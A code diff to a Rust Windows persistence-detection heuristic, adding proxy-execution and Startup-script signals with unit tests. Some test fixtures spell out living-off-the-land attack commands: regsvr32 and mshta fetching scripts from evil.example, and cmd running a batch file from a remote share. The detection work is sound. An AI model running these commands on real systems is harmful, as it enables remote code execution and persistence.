@@ -1,10 +1,11 @@
 //! heur_persist (spec §4.2): dispositive-signal gate over persistence records. A record
 //! that clears the gate (>=1 rare/dispositive signal) becomes a Finding; everything else
 //! is inventory surfaced via `observe()` as an Observation (spec §6).
-use crate::score::{build_cross_index, escalate, join_key};
+use crate::score::{build_cross_index, deescalate, escalate, join_key};
 use crate::trust::{
-    exe_name, invoked_exe, is_interpreter, is_masquerade, is_system_or_program_files,
-    is_user_writable_path, script_markers, winlogon_value_is_default, MarkerKind,
+    exe_name, invocation_args, invoked_exe, is_interpreter, is_masquerade,
+    is_system_or_program_files, is_under_windows_tree, is_user_writable_path, risky_args,
+    script_markers, winlogon_value_is_default, ArgRisk, MarkerKind,
 };
 use cairn_core::finding::{
     EntityFile, EntityPersistence, EntityProcess, EntityRegistry, EvidenceItem,
@@ -67,6 +68,102 @@ fn script_persistence_signal(p: &PersistenceRecord) -> Option<GateHit> {
     None
 }
 
+/// Signed Windows hosts that run or load other code. A persistence entry pointing at
+/// one of them is judged by its ARGUMENTS, since the host binary itself is always
+/// signed and in System32.
+const PROXY_HOSTS: &[(&str, &str)] = &[
+    ("rundll32", "T1218.011"),
+    ("regsvr32", "T1218.010"),
+    ("msiexec", "T1218.007"),
+    ("mshta", "T1218.005"),
+    ("wscript", "T1059.005"),
+    ("cscript", "T1059.005"),
+    ("powershell", "T1059.001"),
+    ("pwsh", "T1059.001"),
+    ("cmd", "T1059.003"),
+];
+
+/// S5: proxy execution. The entry runs a signed Windows host (rundll32, regsvr32,
+/// msiexec, mshta, wscript, cscript, powershell, cmd) whose argument is a DLL/script in
+/// a user-writable folder, a UNC share or a URL -> High. For the interpreters a URL is
+/// already S9's encoded/remote hit, so only the path/share arguments count here.
+fn proxy_exec_signal(p: &PersistenceRecord) -> Option<GateHit> {
+    let cmd = p.command.as_deref()?;
+    let path = p.binary_path.as_deref().unwrap_or("");
+    let host = if path.is_empty() {
+        invoked_exe(cmd)?
+    } else {
+        exe_name(path)
+    };
+    let (_, mitre) = PROXY_HOSTS.iter().find(|(h, _)| *h == host)?;
+    // Only the real host: a bare name, or a path under the Windows tree. A copy
+    // elsewhere is S3's masquerade / S2's drop-zone binary, not proxy execution.
+    let absolute = path.get(1..).is_some_and(|r| r.starts_with(":\\"));
+    if absolute && !is_under_windows_tree(path) {
+        return None;
+    }
+    // Interpreters (cmd, PowerShell, WSH, mshta): S9 already reports a URL argument.
+    let interpreter = is_interpreter(&host);
+    let risks: Vec<ArgRisk> = risky_args(invocation_args(cmd))
+        .into_iter()
+        .filter(|r| !(interpreter && matches!(r, ArgRisk::Url(_))))
+        .collect();
+    if risks.is_empty() {
+        return None;
+    }
+    let what: Vec<String> = risks.iter().map(ToString::to_string).collect();
+    Some(GateHit {
+        severity: Severity::High,
+        label: "系統程式代理執行（使用者可寫路徑或遠端內容）",
+        reason: format!(
+            "persistence runs the signed Windows host {host}.exe, which loads {}: {cmd}",
+            what.join(", ")
+        ),
+        mitre,
+    })
+}
+
+/// Script files Windows runs straight from the Startup folder (through their file
+/// association, without naming an interpreter).
+const STARTUP_SCRIPT_EXTS: &[&str] = &[
+    ".vbs", ".vbe", ".js", ".jse", ".wsf", ".bat", ".cmd", ".ps1", ".hta",
+];
+
+/// Shortcut / link files: the Startup entry is a pointer, and its own location (the
+/// Startup folder, which Windows puts in AppData/ProgramData) says nothing about the
+/// target. Until the collector resolves the target into `binary_path`, such an entry is
+/// judged only by its command, never by the shortcut's path.
+fn is_unresolved_shortcut(path: &str) -> bool {
+    let lower = path.to_ascii_lowercase();
+    [".lnk", ".url", ".pif"].iter().any(|e| lower.ends_with(e))
+}
+
+/// The path the generic S2/S3/S4 signals judge: the target binary. Empty (no verdict)
+/// for a PowerShell profile (judged by content in crate::asep) and for an unresolved
+/// Startup shortcut.
+fn signal_path(p: &PersistenceRecord) -> &str {
+    let path = p.binary_path.as_deref().unwrap_or("");
+    match p.mechanism {
+        Mechanism::PsProfile => "",
+        Mechanism::Startup if is_unresolved_shortcut(path) => "",
+        _ => path,
+    }
+}
+
+/// Service start type (0 boot, 1 system, 2 auto, 3 demand, 4 disabled), when the
+/// collector records it. The record has no start-type field yet (the services
+/// collector currently keeps only Start 0-2), so this is always None and the
+/// demand-start adjustment below is inert until that field lands.
+fn service_start_type(_p: &PersistenceRecord) -> Option<u32> {
+    None
+}
+
+/// Demand-start (Start=3) services run only when something asks for them: a single
+/// signal on one is lowered one band. `None` = start type unknown = no adjustment.
+fn demand_start_lowers(p: &PersistenceRecord, start_type: Option<u32>, signals: usize) -> bool {
+    p.mechanism == Mechanism::Service && start_type == Some(3) && signals == 1
+}
+
 /// Evaluate the dispositive-signal gate for one persistence record (spec §4.2).
 /// Empty vec = no rare signal = inventory, not a detection (route to Observation).
 pub(crate) fn evaluate_gate(p: &PersistenceRecord, now: DateTime<Utc>) -> Vec<GateHit> {
@@ -127,8 +224,7 @@ pub(crate) fn evaluate_gate(p: &PersistenceRecord, now: DateTime<Utc>) -> Vec<Ga
     // normal S2/S3/S4/S9 checks below instead of an extra unconditional branch here.
     // (CommandLineEventConsumer entries, where binary_path is Some, are deliberately left
     // to the normal S2/S3/S4/S9 checks below rather than an extra unconditional branch
-    // here; wmi_subscription must NOT be added to any "exempt from path signals" list,
-    // unlike startup, so those checks apply normally to it.)
+    // here; wmi_subscription must NOT be exempted from the path signals.)
     if p.mechanism == Mechanism::WmiSubscription && p.binary_path.is_none() {
         let content = p.command.as_deref().unwrap_or("");
         let lower = content.to_ascii_lowercase();
@@ -163,23 +259,20 @@ pub(crate) fn evaluate_gate(p: &PersistenceRecord, now: DateTime<Utc>) -> Vec<Ga
         });
     }
 
-    // The Startup folder (%APPDATA%\...\Startup or the all-users ProgramData twin) IS the
-    // persistence location itself, not an arbitrary drop zone — every mechanism's binary_path
-    // signal (S2/S3/S4) assumes the path is where an attacker CHOSE to hide the binary. For
-    // `startup`, Windows already put it in ProgramData/AppData by design, so those same
-    // path-trust checks would flag every legitimate startup shortcut (e.g. AnyDesk.lnk).
-    // Mirrors the pre-gate model's startup path-signal exemption.
-    // Same for PowerShell profiles: the script file IS the persistence location, judged
-    // by its content in crate::asep, not by where Windows keeps it.
-    let path_signals_apply = !p.mechanism.is_file_backed();
+    // Every mechanism, Startup included, is judged by its TARGET binary's signer and
+    // path. What is NOT judged is a location Windows itself chose: a PowerShell profile
+    // (content-judged in crate::asep) and an unresolved Startup shortcut (.lnk), whose
+    // own path is the Startup folder by design (the AnyDesk.lnk false positive).
+    let path = signal_path(p);
 
     // Extended catalog / accessibility IFEO / PowerShell profile signals.
     if let Some(hit) = crate::asep::asep_signal(p) {
         hits.push(hit);
     }
 
-    // S2: explicitly unsigned + user-writable drop zone.
-    if path_signals_apply && p.signed == Some(false) && is_user_writable_path(path) {
+    // S2: unsigned + user-writable drop zone. Some(false) = verified unsigned.
+    let s2 = p.signed == Some(false) && is_user_writable_path(path);
+    if s2 {
         hits.push(GateHit {
             severity: Severity::High,
             label: "未簽章執行檔於使用者可寫路徑",
@@ -190,31 +283,34 @@ pub(crate) fn evaluate_gate(p: &PersistenceRecord, now: DateTime<Utc>) -> Vec<Ga
         });
     }
 
-    // S3: system-name masquerade (absolute path outside C:\Windows).
-    if path_signals_apply && is_masquerade(path) {
+    // S3: system-name masquerade (absolute path outside the name's canonical dir).
+    if is_masquerade(path) {
         hits.push(GateHit {
             severity: Severity::High,
             label: "系統程式名稱偽裝",
-            reason: format!("system binary name at a non-Windows location: {path}"),
+            reason: format!("system binary name outside its canonical directory: {path}"),
             mitre: "T1036.005",
         });
     }
 
-    // S4: recent + unverifiable + outside system/vendor dirs — all three required.
-    // Recency ALONE is dead (update-day mass rewrites, per-user service instances).
-    if path_signals_apply
-        && p.signed.is_none()
-        && !path.is_empty()
-        && !is_system_or_program_files(path)
-    {
+    // S4: recent + not verified signed + outside system/vendor dirs — all three
+    // required. Unsigned (Some(false)) counts like unverifiable (None). Recency ALONE
+    // is dead (update-day mass rewrites, per-user service instances). Skipped when S2
+    // already reported the same unsigned binary.
+    if !s2 && p.signed != Some(true) && !path.is_empty() && !is_system_or_program_files(path) {
         if let Some(lw) = p.last_write {
             let age = now.signed_duration_since(lw);
             if age >= Duration::zero() && age <= Duration::days(RECENT_DAYS) {
+                let sig = if p.signed == Some(false) {
+                    "unsigned"
+                } else {
+                    "signature unverifiable"
+                };
                 hits.push(GateHit {
                     severity: Severity::Medium,
-                    label: "近期建立且簽章無法驗證",
+                    label: "近期建立且未簽章或簽章無法驗證",
                     reason: format!(
-                        "created/modified within {RECENT_DAYS} days, signature unverifiable, non-system path: {path}"
+                        "created/modified within {RECENT_DAYS} days, {sig}, non-system path: {path}"
                     ),
                     mitre: crate::asep::mechanism_mitre(p.mechanism),
                 });
@@ -222,9 +318,34 @@ pub(crate) fn evaluate_gate(p: &PersistenceRecord, now: DateTime<Utc>) -> Vec<Ga
         }
     }
 
-    // S9: script-interpreter persistence.
+    // S5: proxy execution through a signed Windows host.
+    let proxy = proxy_exec_signal(p);
+    let proxied = proxy.is_some();
+    hits.extend(proxy);
+
+    // S6: a script file dropped straight into a Startup folder runs at every logon
+    // through its file association.
+    if p.mechanism == Mechanism::Startup {
+        let lower = path.to_ascii_lowercase();
+        if STARTUP_SCRIPT_EXTS.iter().any(|e| lower.ends_with(e)) {
+            hits.push(GateHit {
+                severity: Severity::Medium,
+                label: "啟動資料夾中的腳本檔",
+                reason: format!(
+                    "script file placed directly in a Startup folder runs at every logon: {path}"
+                ),
+                mitre: "T1547.001",
+            });
+        }
+    }
+
+    // S9: script-interpreter persistence. Its plain local-script tier (Low) describes
+    // the same fact as S5's user-writable script argument, so it is dropped when S5
+    // fired; the encoded/remote tier is a separate fact and stays.
     if let Some(hit) = script_persistence_signal(p) {
-        hits.push(hit);
+        if !(proxied && hit.severity == Severity::Low) {
+            hits.push(hit);
+        }
     }
 
     hits
@@ -408,6 +529,16 @@ impl Analyzer for PersistHeuristic {
                     "corroborated: {} — escalated{suffix}",
                     corr.join("; ")
                 ));
+            }
+
+            let corroborated = !exec_hits.is_empty() || !proc_hits.is_empty();
+            if !corroborated && demand_start_lowers(p, service_start_type(p), hits.len()) {
+                sev = deescalate(sev);
+                reasons.push(
+                    "demand-start service (Start=3) runs only when something starts it — \
+                     lowered one band"
+                        .to_string(),
+                );
             }
 
             let top = hits
@@ -664,9 +795,7 @@ mod tests {
     }
 
     /// A startup (file) mechanism populates entity.file, not entity.registry.
-    /// Uses an S9 script-persistence signal (not a path signal) to clear the gate,
-    /// since startup is deliberately exempt from S2/S3/S4 path-trust checks (the
-    /// Startup folder IS the persistence location, not a suspicious drop zone).
+    /// Uses an S9 script-persistence signal to clear the gate.
     #[test]
     fn startup_mechanism_uses_file_entity() {
         let now = Utc::now();
@@ -823,25 +952,225 @@ mod tests {
         assert!(evaluate_gate(&p, now).iter().any(|h| h.mitre == "T1036"));
     }
 
-    /// The Startup folder IS the persistence location, not a suspicious drop zone —
-    /// S2/S3/S4's path-trust checks must not fire on it (real-machine e2e regression:
-    /// AnyDesk.lnk in the all-users ProgramData Startup folder, unsigned .lnk, recent
-    /// last_write — previously fired S2 as a false positive).
+    /// An unresolved Startup shortcut is judged by its command, not by the shortcut's
+    /// own path (the Startup folder, which Windows places in ProgramData/AppData) —
+    /// real-machine e2e regression: AnyDesk.lnk, unsigned .lnk, recent last_write.
     #[test]
-    fn gate_startup_mechanism_exempt_from_path_signals() {
+    fn gate_startup_shortcut_path_is_not_judged() {
         let now = Utc::now();
-        let startup_shortcut = full_rec(
+        for dir in [
+            r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup",
+            r"C:\Users\a\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup",
+        ] {
+            let lnk = format!(r"{dir}\AnyDesk.lnk");
+            let startup_shortcut = full_rec(
+                Mechanism::Startup,
+                None,
+                Some(&lnk),
+                Some(&lnk),
+                Some(false),
+                Some(now),
+            );
+            assert!(
+                evaluate_gate(&startup_shortcut, now).is_empty(),
+                "the .lnk's own location must not fire S2/S3/S4: {dir}"
+            );
+        }
+    }
+
+    /// The Startup folder is no longer exempt: a resolved target, or a binary dropped
+    /// straight into the folder, is judged like any other mechanism's binary.
+    #[test]
+    fn gate_startup_judges_the_target_binary() {
+        let now = Utc::now();
+        // resolved .lnk target: unsigned binary in AppData -> S2 High
+        let target = full_rec(
             Mechanism::Startup,
-            None,
-            Some(r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\AnyDesk.lnk"),
-            Some(r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\AnyDesk.lnk"),
+            Some("Updater.lnk"),
+            Some(r"C:\Users\a\AppData\Roaming\upd\upd.exe"),
+            Some(r"C:\Users\a\AppData\Roaming\upd\upd.exe"),
             Some(false),
-            Some(now),
+            None,
         );
-        assert!(
-            evaluate_gate(&startup_shortcut, now).is_empty(),
-            "startup mechanism must be exempt from S2/S3/S4 path-trust checks"
+        let hits = evaluate_gate(&target, now);
+        assert!(hits
+            .iter()
+            .any(|h| h.mitre == "T1036" && h.severity == Severity::High));
+        // exe dropped straight into the per-user Startup folder, unverifiable, recent
+        let exe = r"C:\Users\a\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\x.exe";
+        let dropped = full_rec(
+            Mechanism::Startup,
+            Some("x.exe"),
+            Some(exe),
+            Some(exe),
+            None,
+            Some(now - Duration::days(1)),
         );
+        assert_eq!(evaluate_gate(&dropped, now)[0].severity, Severity::Medium);
+        // script file straight in the folder -> S6 Medium even when old
+        let vbs =
+            r"C:\Users\a\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\run.vbs";
+        let script = full_rec(
+            Mechanism::Startup,
+            Some("run.vbs"),
+            Some(vbs),
+            Some(vbs),
+            None,
+            Some(now - Duration::days(300)),
+        );
+        let hits = evaluate_gate(&script, now);
+        assert_eq!(hits.len(), 1);
+        assert_eq!(hits[0].mitre, "T1547.001");
+        // interpreter with a drop-zone script argument -> S5 High
+        let wsh = full_rec(
+            Mechanism::Startup,
+            Some("Sync.lnk"),
+            Some(r"C:\Windows\System32\wscript.exe C:\Users\a\AppData\Local\Temp\s.vbs"),
+            Some(r"C:\Windows\System32\wscript.exe"),
+            Some(true),
+            None,
+        );
+        let hits = evaluate_gate(&wsh, now);
+        assert_eq!(hits.len(), 1, "S9's local-script tier folds into S5");
+        assert_eq!(hits[0].severity, Severity::High);
+        assert_eq!(hits[0].mitre, "T1059.005");
+    }
+
+    /// signed == Some(false) is treated like unverifiable for the recency signal.
+    #[test]
+    fn gate_s4_counts_explicitly_unsigned_like_unverifiable() {
+        let now = Utc::now();
+        let p = full_rec(
+            Mechanism::Service,
+            None,
+            Some(r"C:\Tools\agent.exe"),
+            Some(r"C:\Tools\agent.exe"),
+            Some(false),
+            Some(now - Duration::days(1)),
+        );
+        let hits = evaluate_gate(&p, now);
+        assert_eq!(hits.len(), 1);
+        assert_eq!(hits[0].severity, Severity::Medium);
+        assert!(hits[0].reason.contains("unsigned"), "{}", hits[0].reason);
+    }
+
+    /// S5: a signed System32 host is judged by its arguments.
+    #[test]
+    fn gate_s5_proxy_execution_by_arguments() {
+        let now = Utc::now();
+        let cases = [
+            (
+                r"rundll32.exe C:\Users\a\AppData\Local\Temp\x.dll,Start",
+                r"C:\Windows\System32\rundll32.exe",
+                "T1218.011",
+            ),
+            (
+                r"regsvr32 /s /n /u /i:https://evil.example/x.sct scrobj.dll",
+                r"C:\Windows\System32\regsvr32.exe",
+                "T1218.010",
+            ),
+            (
+                r#"msiexec /q /i "%TEMP%\setup.msi""#,
+                r"C:\Windows\System32\msiexec.exe",
+                "T1218.007",
+            ),
+            (
+                r"powershell.exe -NoP -File C:\Users\Public\a.ps1",
+                r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+                "T1059.001",
+            ),
+            (
+                r"cmd.exe /c \\203.0.113.7\share\a.bat",
+                r"C:\Windows\System32\cmd.exe",
+                "T1059.003",
+            ),
+        ];
+        for (cmd, bin, mitre) in cases {
+            let p = full_rec(
+                Mechanism::RunKey,
+                Some("x"),
+                Some(cmd),
+                Some(bin),
+                Some(true),
+                None,
+            );
+            let hits = evaluate_gate(&p, now);
+            assert!(
+                hits.iter()
+                    .any(|h| h.mitre == mitre && h.severity == Severity::High),
+                "{cmd}: {:?}",
+                hits.iter().map(|h| &h.reason).collect::<Vec<_>>()
+            );
+        }
+        // stock uses stay inventory
+        for (cmd, bin) in [
+            (
+                "rundll32.exe shell32.dll,Control_RunDLL desk.cpl",
+                r"C:\Windows\System32\rundll32.exe",
+            ),
+            (
+                r#"msiexec /i "C:\Program Files\V\v.msi""#,
+                r"C:\Windows\System32\msiexec.exe",
+            ),
+        ] {
+            let p = full_rec(
+                Mechanism::RunKey,
+                Some("x"),
+                Some(cmd),
+                Some(bin),
+                Some(true),
+                None,
+            );
+            assert!(evaluate_gate(&p, now).is_empty(), "{cmd}");
+        }
+        // mshta + URL: one fact, reported once (S9's remote tier), not S5 again
+        let p = full_rec(
+            Mechanism::RunKey,
+            Some("x"),
+            Some("mshta.exe https://evil.example/a.hta"),
+            Some(r"C:\Windows\System32\mshta.exe"),
+            Some(true),
+            None,
+        );
+        let hits = evaluate_gate(&p, now);
+        assert_eq!(
+            hits.len(),
+            1,
+            "{:?}",
+            hits.iter().map(|h| &h.reason).collect::<Vec<_>>()
+        );
+        assert_eq!(hits[0].severity, Severity::High);
+    }
+
+    /// A demand-start service with a single signal is lowered one band; with two
+    /// signals, or with an unknown start type, nothing changes.
+    #[test]
+    fn demand_start_service_lowers_only_a_single_signal() {
+        let svc = full_rec(Mechanism::Service, None, None, None, None, None);
+        assert!(demand_start_lowers(&svc, Some(3), 1));
+        assert!(!demand_start_lowers(&svc, Some(3), 2));
+        assert!(!demand_start_lowers(&svc, Some(2), 1));
+        assert!(!demand_start_lowers(&svc, None, 1));
+        let run = full_rec(Mechanism::RunKey, None, None, None, None, None);
+        assert!(!demand_start_lowers(&run, Some(3), 1));
+        assert_eq!(service_start_type(&svc), None, "no start-type field yet");
+    }
+
+    /// S3 now reaches inside the Windows tree: svchost.exe in C:\Windows\Temp.
+    #[test]
+    fn gate_s3_masquerade_inside_windows_tree() {
+        let now = Utc::now();
+        let p = full_rec(
+            Mechanism::Service,
+            None,
+            Some(r"C:\Windows\Temp\svchost.exe"),
+            Some(r"C:\Windows\Temp\svchost.exe"),
+            Some(true),
+            None,
+        );
+        assert!(evaluate_gate(&p, now)
+            .iter()
+            .any(|h| h.mitre == "T1036.005"));
     }
 
     #[test]
